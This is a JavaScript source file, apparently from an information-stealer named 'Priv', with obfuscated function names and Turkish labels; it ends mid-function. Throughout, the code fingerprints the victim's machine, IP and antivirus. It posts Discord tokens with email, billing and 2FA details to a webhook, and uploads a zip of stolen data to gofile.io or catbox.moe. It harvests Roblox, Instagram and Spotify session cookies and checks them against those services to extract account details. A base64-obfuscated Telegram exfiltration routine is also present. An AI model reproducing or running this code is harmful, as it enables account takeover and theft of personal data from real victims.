    pc: '<:pc:1413214402769064129>',
    key: '<:key:1413214568448266320>',
    notebook: '<:notebook:1413218184265338980>',
    url: '<:url:1413220079373389854>',
    hwid: '<:hwid:1413220503614783618>',
    crown2: '<a:crown2:1413222572090331337>',
    idcard: '<:idcard:1413222293869432882>',
    cookies: '<:cookies:1413222163627901051>',
    world: '<:world:1413221837676220446>',
    pin: '<a:pin:1413224189074079744>',
    email: '<:email:1413229353843691680>',
    phone: '<:phone:1413229602662252785>',
    lockk: '<:lockk:1413229832829014056>',
    badgespremium: '<:badgespremium:1413230008872210454>',
    boostedhome: '<:boostedhome:1413230424951488522>',
    cards: '<:cards:1413230537958625330>'
};
const BADGES = {
    DISCORD_EMPLOYEE: {
        value: 1,
        emoji: '<:discord_employee:1387742493046734979>',
        rare: true
    },
    PARTNERED_SERVER_OWNER: {
        value: 2,
        emoji: '<:partnered_server_owner:1387742553394253834>',
        rare: true
    },
    HYPESQUAD_EVENTS: {
        value: 4,
        emoji: '<:hypesquad_events:1387742522545279056>',
        rare: true
    },
    BUG_HUNTER_LEVEL_1: {
        value: 8,
        emoji: '<:bughunter:1387742487690612887>',
        rare: true
    },
    LEGACY_USERNAME: {
        value: 32,
        emoji: '<:oldusername:1387742549225115680>',
        rare: false
    },
    HOUSE_BRAVERY: {
        value: 64,
        emoji: '<:bravery:1387742465544687707>',
        rare: false
    },
    HOUSE_BRILLIANCE: {
        value: 128,
        emoji: '<:brilliance:1387742466697990285>',
        rare: false
    },
    HOUSE_BALANCE: {
        value: 256,
        emoji: '<:balance:1387742461014573058>',
        rare: false
    },
    EARLY_SUPPORTER: {
        value: 512,
        emoji: '<:early_supporter:1387742496796315779>',
        rare: true
    },
    BUG_HUNTER_LEVEL_2: {
        value: 16384,
        emoji: '<:bughuntergold:1387742489338970123>',
        rare: true
    },
    EARLY_BOT_DEVELOPER: {
        value: 131072,
        emoji: '<:early_verified_bot_developer:1387742498226573342>',
        rare: true
    },
    CERTIFIED_MODERATOR: {
        value: 262144,
        emoji: '<:moderatorprogramsalumni:1387742524105429032>',
        rare: true
    },
    ACTIVE_DEVELOPER: {
        value: 4194304,
        emoji: '<:active_developer:1387742440697368606>',
        rare: false
    }
};
const NITRO_BADGES = ['<:boost1month:1387742464202379324>', '<:2monthsboostnitro:1387742437723602975>', '<:nitro_boost_3_months:1387742527339102338>', '<:6months_boost:1387742439477088287>', '<:nitro_boost_9_months:1387742529289457674>', '<:12monthsboostnitro:1387742435769061417>', '<:boost15month:1387742462629511270>', '<:nitro_boost_18_months:1387742525699260538>', '<:24_months:1387742436742139974>'];
const NITRO_TIERS = {
    1: '<:bronze:1387742468727898182>',
    3: '<:silver:1387742580300582974>',
    6: '<:gold:1387742520733204480>',
    12: '<:platinum:1387742556649164922>',
    24: '<:diamond:1387742491629060156>',
    36: '<:emerald:1387742518153707570>',
    60: '<:ruby:1387742559970922496>',
    72: '<:opal:1387742550919614496>'
};
function xz6a7(premium_type, premium_guild_since, premium_since) {
    if (!premium_type || premium_type === 0) {
        return '<:6370silverquestionmark:1441848044978180207>';
    }
    let nitroMonths = 0;
    if (premium_since) {
        nitroMonths = Math.floor((Date.now() - new Date(premium_since).getTime()) / 2592000000);
    } else {
        nitroMonths = 1;
    }
    let tierBadge = '<:discord_nitro:1387742494610952194>';
    const tierKeys = Object.keys(NITRO_TIERS).map(Number).sort((a, b) => b - a);
    for (const months of tierKeys) {
        if (nitroMonths >= months) {
            tierBadge = NITRO_TIERS[months];
            break;
        }
    }
    if (premium_type === 1) {
        return tierBadge;
    }
    if (premium_type === 2) {
        if (!premium_guild_since) {
            return tierBadge;
        }
        const boostMonths = Math.floor((Date.now() - new Date(premium_guild_since).getTime()) / 2592000000);
        let boostBadge = NITRO_BADGES[0];
        if (boostMonths >= 24) {
            boostBadge = NITRO_BADGES[8];
        } else if (boostMonths >= 18) {
            boostBadge = NITRO_BADGES[7];
        } else if (boostMonths >= 15) {
            boostBadge = NITRO_BADGES[6];
        } else if (boostMonths >= 12) {
            boostBadge = NITRO_BADGES[5];
        } else if (boostMonths >= 9) {
            boostBadge = NITRO_BADGES[4];
        } else if (boostMonths >= 6) {
            boostBadge = NITRO_BADGES[3];
        } else if (boostMonths >= 3) {
            boostBadge = NITRO_BADGES[2];
        } else if (boostMonths >= 2) {
            boostBadge = NITRO_BADGES[1];
        }
        return `${tierBadge} ${boostBadge}`;
    }
    return '<:6370silverquestionmark:1441848044978180207>';
}
async function xb8c9() {
    return new Promise(resolve => {
        https.get('https://ipinfo.io/json', res => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const info = JSON.parse(data);
                    resolve({
                        ip: info.ip || 'N/A',
                        country: info.country || 'N/A',
                        city: info.city || 'N/A',
                        region: info.region || 'N/A',
                        org: info.org || 'N/A'
                    });
                } catch (e) {
                    resolve({
                        ip: 'N/A',
                        country: 'N/A',
                        city: 'N/A',
                        region: 'N/A',
                        org: 'N/A'
                    });
                }
            });
        }).on('error', () => {
            resolve({
                ip: 'N/A',
                country: 'N/A',
                city: 'N/A',
                region: 'N/A',
                org: 'N/A'
            });
        });
    });
}
async function xd0e1() {
    const detected = [];
    const avPaths = ["C:\\Program Files\\Avast Software", "C:\\Program Files\\McAfee", "C:\\Program Files\\Norton", "C:\\Program Files\\Kaspersky Lab", "C:\\Program Files\\BitDefender", "C:\\Program Files\\ESET", "C:\\Program Files\\AVG", "C:\\Program Files\\Malwarebytes", "C:\\Program Files\\Sophos", "C:\\Program Files (x86)\\Avast Software", "C:\\Program Files (x86)\\McAfee", "C:\\Program Files (x86)\\Norton", "C:\\Program Files (x86)\\Kaspersky Lab", "C:\\Program Files (x86)\\BitDefender", "C:\\Program Files (x86)\\ESET", "C:\\Program Files (x86)\\AVG", "C:\\Program Files (x86)\\Malwarebytes", "C:\\Program Files (x86)\\Sophos"];
    for (const p of avPaths) {
        if (fs.existsSync(p)) {
            const avName = p.includes('Avast') ? 'Avast' : p.includes('McAfee') ? 'McAfee' : p.includes('Norton') ? 'Norton' : p.includes('Kaspersky') ? 'Kaspersky' : p.includes('BitDefender') ? 'BitDefender' : p.includes('ESET') ? 'ESET' : p.includes('AVG') ? 'AVG' : p.includes('Malwarebytes') ? 'Malwarebytes' : p.includes('Sophos') ? 'Sophos' : 'Unknown AV';
            detected.push(avName);
        }
    }
    return [...new Set(detected)];
}
async function xf2g3() {
    const totalMem = os.totalmem() / 1073741824;
    const freeMem = os.freemem() / 1073741824;
    const usedMem = totalMem - freeMem;
    const uptimeSeconds = os.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor(uptimeSeconds % 3600 / 60);
    const cpus = os.cpus();
    const cpuModel = cpus[0]?.model || 'Unknown';
    const cpuCores = cpus.length;
    const ipInfo = await xb8c9();
    const av = await xd0e1();
    return {
        title: '**priv Project | System Infos**',
        color: 0x1F2124,
        fields: [{
            name: '🌐 ağ',
            value: `IP → \`${ipInfo.ip}\`\nCountry → \`${ipInfo.country}\`\nCity → \`${ipInfo.city}\``,
            inline: true
        }, {
            name: '💻 sistem',
            value: `Hostname → \`${os.hostname()}\`\nRAM → \`${usedMem.toFixed(2)} / ${totalMem.toFixed(2)} GB\`\nOS → \`${os.type()} ${os.release()}\``,
            inline: true
        }, {
            name: '⚙️ heweid',
            value: `CPU → \`${cpuModel} (${cpuCores} cores)\`\nUptime → \`${hours}h ${minutes}m\``,
            inline: true
        }, {
            name: '🛡️ anti vayrüs',
            value: av.length ? `\`${av.join(', ')}\`` : '`None detected`',
            inline: true
        }],
        footer: {
            text: 'priv'
        },
        timestamp: new Date().toISOString()
    };
}
function xh4i5(flags, username) {
    const badges = [];
    const rareBadges = [];
    for (const [key, badge] of Object.entries(BADGES)) {
        if (flags & badge.value) {
            badges.push(badge.emoji);
            if (badge.rare) {
                rareBadges.push(`${badge.emoji} | \`${username}\``);
            }
        }
    }
    return {
        display: badges.length > 0 ? badges.join(' ') : '<:6370silverquestionmark:1441848044978180207>',
        rare: rareBadges.length > 0 ? rareBadges.join("\n") : null
    };
}
function xj6k7(text) {
    if (text === null || text === undefined) {
        return '';
    }
    const str = String(text);

    const map = {
        'auth': '🔐',
        'mencaoxx': '👤',
        'userrxs': '🏷️',
        'xxxxww': '🆔',
        'badges': '🏅',
        'cxsjjdzx': '🔗',
        'email': '📧',
        'phone': '📱',
        'kurabiye': '🍪',
        'kart': '💳',
        'lockk': '🔒',
        'idcard': '🪪',
        'world': '🌍',
        'paypal': '🅿️',
        'pc': '💻',
        'key': '🔑',
        'notebook': '📓',
        'url': '🌐',
        'hwid': '🖥️',
        'crown2': '👑',
        'pin': '📌',
        'badgespremium': '💎',
        'boostedhome': '🚀',
        'discord_nitro': '🚀',
        '2fa': '🔒',
        'nitrotype': '🚀',
        'billing': '💳',
        'emailphone': '📧',
        'ip': '📍',
        'country': '🏳️',
        'displayname': '🏷️',
        'jeton': '🔑'
    };

    let cleaned = str.replace(/<a?:(\w+):(\d+)>/g, (match, name) => {
        return map[name] || '';
    });

    cleaned = cleaned.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

    cleaned = cleaned.replace(/\*\*(.*?)\*\*/g, '<b>$1</b>');
    cleaned = cleaned.replace(/\*(.*?)\*/g, '<i>$1</i>');
    cleaned = cleaned.replace(/_(.*?)_/g, '<i>$1</i>');
    cleaned = cleaned.replace(/__(.*?)__/g, '<u>$1</u>');
    cleaned = cleaned.replace(/~~(.*?)~~/g, '<s>$1</s>');
    cleaned = cleaned.replace(/`(.*?)`/g, '<code>$1</code>');
    cleaned = cleaned.replace(/```([\s\S]*?)```/g, '<pre>$1</pre>');
    cleaned = cleaned.replace(/\[(.*?)\]\((.*?)\)/g, "<a href=\"$2\">$1</a>");
    return cleaned;
}
async function xl8m9(payload) {
    return;
    const tgBase = Buffer.from('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3Jn', 'base64').toString();
    const tgBot = Buffer.from('Ym90', 'base64').toString();
    const tgSend = Buffer.from('c2VuZE1lc3NhZ2U=', 'base64').toString();
    let fullMessage = '';
    if (payload.content) {
        fullMessage += `${xj6k7(payload.content)}\n\n`;
    }
    if (payload.embeds) {
        for (const embed of payload.embeds) {
            if (embed.author && embed.author.name) {
                fullMessage += `<b>${xj6k7(embed.author.name)}</b>\n`;
            }
            if (embed.title) {
                fullMessage += `<b>${xj6k7(embed.title)}</b>\n`;
            }
            if (embed.description) {
                fullMessage += `${xj6k7(embed.description)}\n`;
            }
            if (embed.fields) {
                for (const field of embed.fields) {
                    fullMessage += `<b>${xj6k7(field.name)}</b>\n${xj6k7(field.value)}\n`;
                }
            }
            if (embed.footer && embed.footer.text) {
                fullMessage += `<i>${xj6k7(embed.footer.text)}</i>\n`;
            }

            if (embed.image && embed.image.url && !embed.description && !embed.fields) {
                fullMessage += `<a href="${embed.image.url}">📸 View Image</a>\n`;
            }
            fullMessage += `\n${'─'.repeat(15)}\n\n`;
        }
    }
    if (!fullMessage.trim()) {
        return;
    }
    const chunks = [];
    while (fullMessage.length > 0) {
        if (fullMessage.length <= 4000) {
            chunks.push(fullMessage);
            break;
        }
        let chunk = fullMessage.substring(0, 4000);
        const lastNewline = chunk.lastIndexOf("\n");
        if (lastNewline > 3200) {
            chunk = fullMessage.substring(0, lastNewline);
            fullMessage = fullMessage.substring(lastNewline + 1);
        } else {
            fullMessage = fullMessage.substring(4000);
        }
        chunks.push(chunk);
    }
    for (const chunk of chunks) {
        if (!chunk.trim()) {
            continue;
        }
        await xn0o1(tgBase, tgBot, token, tgSend, chatId, chunk);
        await new Promise(r => setTimeout(r, 250)); // Rate limit protection
    }
}
async function xn0o1(tgBase, tgBot, token, tgSend, chatId, text) {
    try {
        await axios.post(`${tgBase}/${tgBot}${token}/${tgSend}`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            disable_web_page_preview: true
        });
    } catch (e) {
        console.error('TG Send Error:', e.message);
        try {
            let plainText = text.replace(/<a href="([^"]+)">([^<]+)<\/a>/g, '$2 ($1)');

            plainText = plainText.replace(/<[^>]*>/g, '').replace(/&amp;/g, '&').replace(/&lt;/g, '<').replace(/&gt;/g, '>');
            await axios.post(`${tgBase}/${tgBot}${token}/${tgSend}`, {
                chat_id: chatId,
                text: plainText
            });
        } catch (e2) {
            console.error('TG Fallback Error:', e2.message);
        }
    }
}
async function xp2q3(payload) {
    try {
        await axios.post(qwexrdsalak, payload, {
            headers: {
                'Content-Type': 'application/json'
            },
            timeout: 30000
        });
    } catch (error) {
        console.error('Log send error:', error.message);
    }
}
async function xr4s5(token, platform, userInfo) {
    return new Promise(async (resolve, reject) => {
        try {
            const flags = userInfo.flags || userInfo.public_flags || 0;
            const badgeInfo = xh4i5(flags, userInfo.username || 'Unknown');
            const nitroDisplay = xz6a7(userInfo.premium_type, userInfo.premium_guild_since, userInfo.premium_since);
            const ipInfo = await xb8c9();
            const username = userInfo.username || 'Unknown';
            const userId = userInfo.id || '0';
            const discriminator = userInfo.discriminator || '0';
            let badgeDisplay = badgeInfo.display;
            if (badgeDisplay === '<:6370silverquestionmark:1441848044978180207>') {
                badgeDisplay = '<:no:1441846323530956972>';
            }
            const hasBilling = userInfo.has_payment_methods ? "<:27285blacktick:1441847129323868362>" : "<:no:1441846323530956972>";
            const tokenFields = [{
                name: "<a:token:1404435272166408202> cok gizli jeton",
                value: `${`||${token}||`}\n[Copy Token](https://copytoken.vercel.app/copy.html?token=${token})`,
                inline: false
            }, {
                name: "<a:displayname:1405540702380888194> Dispiley Name",
                value: `\`${userInfo.global_name || username}\``,
                inline: true
            }, {
                name: `${'<:pc:1405541015531687996>'} pilatform`,
                value: `\`${platform}\``,
                inline: true
            }, {
                name: "<a:badges:1402924966923735050> bedgıs",
                value: badgeDisplay,
                inline: true
            }, {
                name: "<a:2fa:1405561235491131434> 2fa ",
                value: userInfo.mfa_enabled ? "<:27285blacktick:1441847129323868362>" : "<:no:1441846323530956972>",
                inline: true
            }, {
                name: "<:nitrotype:1473258700373495952> nitro",
                value: nitroDisplay,
                inline: true
            }, {
                name: "<:billing:1337494277160173679> Billuring",
                value: `${hasBilling}`,
                inline: true
            }, {
                name: "<:emailphone:1404804297434202205> meil UwU",
                value: userInfo.email ? `\`${userInfo.email}\`` : '`No Email`',
                inline: true
            }, {
                name: "<a:ip:1404435272166408202> aypi",
                value: `\`${ipInfo.ip}\``,
                inline: true
            }, {
                name: "<a:country:1320457581596119190> ülke",
                value: `\`${ipInfo.country}\``,
                inline: true
            }];
            const tokenEmbed = {
                author: {
                    name: `${username} (${userId})`,
                    icon_url: "https://cdn.discordapp.com/attachments/1470597089917403268/1473199432324616243/F-XEkduXAAA6kuL.png?ex=69955763&is=699405e3&hm=cf0467a52107f5e53056974b58f290fa0a80c5e348aa0250a8140a622d73e82b&"
                },
                thumbnail: {
                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userId}/${userInfo.avatar}.png` : `https://cdn.discordapp.com/embed/avatars/${parseInt(discriminator) % 5}.png`
                },
                color: 0x2C2F33,
                fields: tokenFields
            };
            let hqDescription = '`No HQ Friends`';
            if (userInfo.hqFriendsCount > 0) {
                hqDescription = userInfo.hqFriendsList.slice(0, 15).map(friend => {
                    const flags = friend.flags || 0;
                    const badgeEmojis = [];
                    for (const [key, badge] of Object.entries(BADGES)) {
                        if (badge.rare && (flags & badge.value) !== 0) {
                            badgeEmojis.push(badge.emoji);
                        }
                    }
                    const badgeDisplay = badgeEmojis.length > 0 ? badgeEmojis.join(' ') : '<:6370silverquestionmark:1441848044978180207>';
                    return `${badgeDisplay} | \`${friend.username}\``;
                }).join("\n");
            }
            const hqEmbed = {
                color: 0x2C2F33,
                author: {
                    name: `HQ Friends (${userInfo.friendsCount || 0})`,
                    icon_url: "https://cdn.discordapp.com/attachments/1470597089917403268/1473199432324616243/F-XEkduXAAA6kuL.png?ex=69955763&is=699405e3&hm=cf0467a52107f5e53056974b58f290fa0a80c5e348aa0250a8140a622d73e82b&"
                },
                description: hqDescription,
                footer: {
                    text: `priv`
                }
            };
            const embeds = [tokenEmbed, hqEmbed];
            const payload = {
                content: null,
                username: "PrivvVvV",
                avatar_url: "https://cdn.discordapp.com/attachments/1470597089917403268/1473199432324616243/F-XEkduXAAA6kuL.png?ex=69955763&is=699405e3&hm=cf0467a52107f5e53056974b58f290fa0a80c5e348aa0250a8140a622d73e82b&",
                embeds: embeds
            };
            await xp2q3(payload);
            console.log('[+] Token sent successfully');
            resolve();
        } catch (error) {
            console.error('[-] Error preparing webhook:', error.message);
            reject(error);
        }
    });
}
async function xt6u7(zipPath) {
    if (!fs.existsSync(zipPath)) {
        console.log('[!] Zip file not found');
        return false;
    }
    try {
        console.log('[+] Uploading zip to gofile.io...');
        const gofileLink = await xv8w9(zipPath);
        console.log('[+] Sending gofile.io link to webhook...');
        const systemEmbed = await xf2g3();
        const embed = {
            ...systemEmbed,
            fields: [...(systemEmbed.fields || []), {
                name: '📁 ele gecirilen bilgiler',
                value: `[Download ZIP](${gofileLink})`,
                inline: false
            }]
        };
        const payload = {
            content: `\`${os.userInfo().username}\` - \`${os.hostname()}\``,
            username: "Priv",
            avatar_url: "https://cdn.discordapp.com/attachments/1470597089917403268/1473199432324616243/F-XEkduXAAA6kuL.png?ex=69955763&is=699405e3&hm=cf0467a52107f5e53056974b58f290fa0a80c5e348aa0250a8140a622d73e82b&",
            embeds: [embed]
        };
        await xp2q3(payload);
        console.log('[+] goFile.io link sent to webhook successfully');
        return true;
    } catch (error) {
        console.error('[-] goFile.io upload error:', error.message);
        return false;
    }
}
async function xv8w9(zipPath) {
    if (!fs.existsSync(zipPath)) {
        return null;
    }
    let servers = [];
    try {
        const serverRes = await axios.get('https://api.gofile.io/servers', {
            timeout: 15000
        });
        if (serverRes.data && serverRes.data.status === 'ok' && serverRes.data.data && serverRes.data.data.servers) {
            servers = serverRes.data.data.servers.map(s => s.name);
            console.log(`[+] Got ${servers.length} servers from API: ${servers.join(', ')}`);
        } else {
            console.log('[!] API returned invalid data, trying default servers');
            servers = ['store1', 'store2', 'store3', 'store4'];
        }
    } catch (e) {
        console.log('[!] Failed to get servers from API:', e.message);
        servers = ['store1', 'store2', 'store3', 'store4'];
    }
    for (const uploadServer of servers) {
        try {
            console.log(`[+] Trying gofile server: ${uploadServer}`);
            const form = new FormData();
            form.append('file', fs.createReadStream(zipPath));
            const res = await axios.post(`https://${uploadServer}.gofile.io/contents/uploadfile`, form, {
                headers: {
                    ...form.getHeaders(),
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                maxBodyLength: Infinity,
                maxContentLength: Infinity,
                timeout: 50000
            });
            if (res && res.data && res.data.status === 'ok') {
                const data = res.data.data;
                const downloadLink = data.downloadPage || `https://gofile.io/d/${data.fileId}`;
                console.log('[+] Gofile upload successful:', downloadLink);
                return downloadLink;
            } else {
                console.log(`[!] Server ${uploadServer} failed - status: ${res.data?.status}`);
            }
        } catch (e) {
            const errorMsg = e.response?.data || e.message || e;
            console.log(`[!] Server ${uploadServer} error:`, errorMsg);
        }
    }
    console.log('[!] All gofile servers failed, trying catbox.moe...');
    try {
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', fs.createReadStream(zipPath));
        const res = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: {
                ...form.getHeaders(),
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            maxBodyLength: Infinity,
            maxContentLength: Infinity,
            timeout: 90000
        });
        if (res && res.data && typeof res.data === 'string' && res.data.startsWith('https://')) {
            console.log('[+] Catbox upload successful:', res.data.trim());
            return res.data.trim();
        } else {
            console.log('[!] Catbox returned invalid response:', res.data);
        }
    } catch (e) {
        console.log('[!] Catbox error:', e.message);
    }
    console.error('[!] All upload methods failed');
    return null;
}
function xx0y1(filePath) {
    const cookies = [];
    try {
        if (!fs.existsSync(filePath)) {
            return cookies;
        }
        const content = fs.readFileSync(filePath, 'utf8');
        const regex = /\.ROBLOSECURITY[^\s]+/g;
        const matches = content.match(regex);
        if (matches) {
            matches.forEach(match => {
                const cookie = match.replace('.ROBLOSECURITY=', '');
                if (cookie && !cookies.includes(cookie)) {
                    cookies.push(cookie);
                }
            });
        }
    } catch (err) {
        console.log('[ROBLOX] Error reading cookies file:', err.message);
    }
    return cookies;
}
function xz2a3(outputDir, cookieName = null) {
    const cookies = [];
    try {
        if (!fs.existsSync(outputDir)) {
            return cookies;
        }
        const files = xb4c5(outputDir, '.txt');
        files.forEach(file => {
            try {
                const content = fs.readFileSync(file, 'utf8');
                const lines = content.split(/\r?\n/);
                for (const line of lines) {
                    const parts = line.trim().split(/\s+/);
                    if (parts.length >= 7) {
                        if (cookieName === '.ROBLOSECURITY' && parts[5] === '.ROBLOSECURITY') {
                            const cookie = parts[6];
                            if (cookie && !cookies.includes(cookie)) {
                                cookies.push(cookie);
                            }
                        } else if (cookieName === 'sessionid' && parts[5] === 'sessionid') {
                            const cookie = parts[6];
                            if (cookie && !cookies.includes(cookie)) {
                                cookies.push(cookie);
                            }
                        } else if (cookieName === 'sp_dc' && parts[5] === 'sp_dc') {
                            const cookie = parts[6];
                            if (cookie && !cookies.includes(cookie)) {
                                cookies.push(cookie);
                            }
                        } else if (!cookieName && parts[5]) {
                            const cookie = parts[6];
                            if (cookie && !cookies.includes(cookie)) {
                                cookies.push(cookie);
                            }
                        }
                    }
                }
            } catch (err) { }
        });
    } catch (err) { }
    return cookies;
}
function xb4c5(dir, ext) {
    const files = [];
    try {
        const items = fs.readdirSync(dir);
        for (const item of items) {
            const fullPath = path.join(dir, item);
            const stat = fs.statSync(fullPath);
            if (stat.isDirectory()) {
                files.push(...xb4c5(fullPath, ext));
            } else if (stat.isFile() && (!ext || item.endsWith(ext))) {
                files.push(fullPath);
            }
        }
    } catch (err) { }
    return files;
}
async function xd6e7(cookie) {
    const headers = {
        Cookie: `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Roblox/WinInet'
    };
    try {
        const resp = await axios.get('https://users.roblox.com/v1/users/authenticated', {
            headers
        });
        if (!resp?.data) {
            return null;
        }
        let robux = 0;
        try {
            const balance = await axios.get('https://economy.roblox.com/v1/user/currency', {
                headers
            });
            robux = balance?.data?.robux || 0;
        } catch {
            console.log('[ROBLOX] Could not get Robux balance');
        }
        return {
            id: resp.data.id,
            username: resp.data.name,
            displayName: resp.data.displayName,
            robux
        };
    } catch (err) {
        console.log('[ROBLOX] Request failed:', err.response?.status || err.message);
        return null;
    }
}
async function xf8g9(cookie) {
    const data = await xd6e7(cookie);
    if (!data) {
        console.log('[ROBLOX] No valid data found for cookie');
        return;
    }
    const payload = {
        username: 'xd',
        avatar_url: 'https://cdn.discordapp.com/attachments/1470597089917403268/1473199432324616243/F-XEkduXAAA6kuL.png?ex=69955763&is=699405e3&hm=cf0467a52107f5e53056974b58f290fa0a80c5e348aa0250a8140a622d73e82b&',
        embeds: [{
            author: {
                name: 'Roblox',
                icon_url: 'https://cdn.discordapp.com/attachments/1470597089917403268/1473199432324616243/F-XEkduXAAA6kuL.png?ex=69955763&is=699405e3&hm=cf0467a52107f5e53056974b58f290fa0a80c5e348aa0250a8140a622d73e82b&'
            },
            description: `\`\`\`${cookie}\`\`\``,
            fields: [{
                name: '<:auth:1316345705341911063> Roblox Info',
                value: `> <:mencaoxx:1352260535357280377> **Username**: \`${data.username}\`\n` + `> <a:userrxs:1404804117150437436> **Display Name**: \`${data.displayName}\`\n` + `> <a:xxxxww:1404804117150437436> **User ID**: \`${data.id}\`\n` + `> <a:badges:1404804117150437436> **Robux**: \`${data.robux}\`\n` + `> <a:cxsjjdzx:1404804117150437436> **Profile**: [Open Profile](https://www.roblox.com/users/${data.id}/profile)`,
                inline: false
            }],
            color: 0x2b2d31,
            footer: {
                text: `Priv | `
            }
        }]
    };
    try {
        await xp2q3(payload);
        console.log(`[ROBLOX] Sent to webhook: ${data.username} | Robux: ${data.robux}`);
    } catch (err) {
        console.log('[ROBLOX] Failed to send webhook:', err.response?.data || err.message);
    }
}
async function xh0i1(outputDir) {
    console.log('[ROBLOX] Scanning cookies in output directory:', outputDir);
    const cookies = xz2a3(outputDir, '.ROBLOSECURITY');
    console.log(`[ROBLOX] Total cookies found: ${cookies.length}`);
    for (const cookie of cookies) {
        await xf8g9(cookie);
    }
}
async function xj2k3(cookie) {
    const headers = {
        Host: 'i.instagram.com',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'User-Agent': 'Instagram 275.0.0.27.98 Android (30/11; 420dpi; 1080x1920; Xiaomi; Redmi Note 7; violet; qcom; en_US; 440914592)',
        Cookie: `sessionid=${cookie};`
    };
    let data = {};
    try {
        let response = await axios.get('https://i.instagram.com/api/v1/accounts/current_user/?edit=true', {
            headers,
            timeout: 6000
        });
        if (response?.data?.user) {
            const user = response.data.user;
            data.username = user.username;
            data.verified = user.is_verified;
            data.avatar = user.profile_pic_url;
            data.sessionid = cookie;
            data.id = user.pk_id;
            data.number = user.phone_number || 'None';
            data.mail = user.email || 'None';
            data.name = user.full_name || 'None';
            data.bio = user.biography || 'None';
            const response2 = await axios.get(`https://i.instagram.com/api/v1/users/${data.id}/info`, {
                headers
            });
            if (response2?.data?.user) {
                data.followers = response2.data.user.follower_count || 0;
                data.follows = response2.data.user.following_count || 0;
            } else {
                data.followers = 0;
                data.follows = 0;
            }
        } else {
            response = await axios.get('https://i.instagram.com/api/v1/accounts/current_user/', {
                headers,
                timeout: 6000
            });
            if (response?.data?.user) {
                const user = response.data.user;
                data.username = user.username;
                data.verified = user.is_verified;
                data.avatar = user.profile_pic_url;
                data.sessionid = cookie;
                data.id = user.pk_id;
                data.number = user.phone_number || 'None';
                data.mail = user.email || 'None';
                data.name = user.full_name || 'None';
                data.bio = user.biography || 'None';
                const response2 = await axios.get(`https://i.instagram.com/api/v1/users/${data.id}/info`, {
                    headers,
                    timeout: 6000
                });
                if (response2?.data?.user) {
                    data.followers = response2.data.user.follower_count || 0;
                    data.follows = response2.data.user.following_count || 0;
                } else {
                    data.followers = 0;
                    data.follows = 0;
                }
            }
        }
    } catch (err) {
        if (err.response?.status === 403) {
            return data;
        } else {
            console.log('[INSTAGRAM] Error:', err.message);
        }
    }
    return data;
}
const processedInstagramUsers = new Set();
async function xl4m5(data) {
    if (!data.username) {
        return;
    }
    const payload = {
        username: 'xd',
        avatar_url: 'https://cdn.discordapp.com/attachments/1470597089917403268/1473199432324616243/F-XEkduXAAA6kuL.png?ex=69955763&is=699405e3&hm=cf0467a52107f5e53056974b58f290fa0a80c5e348aa0250a8140a622d73e82b&',
        embeds: [{
            author: {
                name: 'xd (Instagram Session)',
                icon_url: 'https://cdn.discordapp.com/attachments/1470597089917403268/1473199432324616243/F-XEkduXAAA6kuL.png?ex=69955763&is=699405e3&hm=cf0467a52107f5e53056974b58f290fa0a80c5e348aa0250a8140a622d73e82b&'
            },
            fields: [{
                name: 'Cookie:',
                value: `\`\`\`${data.sessionid}\`\`\``,
                inline: false
            }, {
                name: 'Username:',
                value: `\`${data.username || 'None'}\``,
                inline: true
            }, {
                name: 'Name:',
                value: `\`${data.name || 'None'}\``,
                inline: true
            }, {
                name: 'Email:',
                value: `\`${data.mail || 'None'}\``,
                inline: true
            }, {
                name: 'Phone Number:',
                value: `\`${data.number || 'None'}\``,
                inline: true
            }, {
                name: 'Follower Count:',
                value: `\`${data.followers || 0}\``,
                inline: true
            }, {
                name: 'Follows Count:',
                value: `\`${data.follows || 0}\``,
                inline: true
            }, {
                name: 'Verified:',
                value: `\`${data.verified ? 'Yes' : 'No'}\``,
                inline: true
            }],
            thumbnail: {
                url: data.avatar
            },
            color: 0x2b2d31,
            footer: {
                text: `Priv | `
            }
        }]
    };
    try {
        await xp2q3(payload);
        console.log('[INSTAGRAM] Sent:', data.username);
    } catch (err) {
        console.log('[INSTAGRAM] Webhook error:', err.message);
    }
}
async function xn6o7(outputDir) {
    console.log('[INSTAGRAM] Scanning cookies in output directory:', outputDir);
    const cookies = xz2a3(outputDir, 'sessionid');
    console.log(`[INSTAGRAM] Total cookies found: ${cookies.length}`);
    const uniqueCookies = [...new Set(cookies)];
    console.log(`[INSTAGRAM] Unique cookies: ${uniqueCookies.length}`);
    let successCount = 0;
    for (let i = 0; i < uniqueCookies.length; i++) {
        const cookie = uniqueCookies[i];
        try {
            const data = await xj2k3(cookie);
            if (!data || !data.username) {
                continue;
            }
            if (processedInstagramUsers.has(data.username)) {
                console.log('[INSTAGRAM] Skipping duplicate user:', data.username);
                continue;
            }
            processedInstagramUsers.add(data.username);
            await xl4m5(data);
            successCount++;
        } catch (err) {
            console.log(`[INSTAGRAM] Error processing cookie: ${err.message}`);
        }
    }
    console.log(`[INSTAGRAM] Successfully sent ${successCount} unique accounts`);
}
async function xp8q9(outputDir) {
    try {
        console.log('[SPOTIFY] Scanning cookies in output directory:', outputDir);
        const cookies = xz2a3(outputDir, 'sp_dc');
        console.log(`[SPOTIFY] Total cookies found: ${cookies.length}`);
        for (const cookie of cookies) {
            await xr0s1(cookie);
        }
    } catch (err) {
        console.error('[SPOTIFY] Error:', err.message);
    }
}
async function xr0s1(sp_dc) {
    const headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
        Cookie: `sp_dc=${sp_dc}`
    };
    const response = await axios.get('https://www.spotify.com/api/account-settings/v1/profile', {
        headers
    }).catch(() => null);
    if (!response || !response.data || !response.data.profile) {
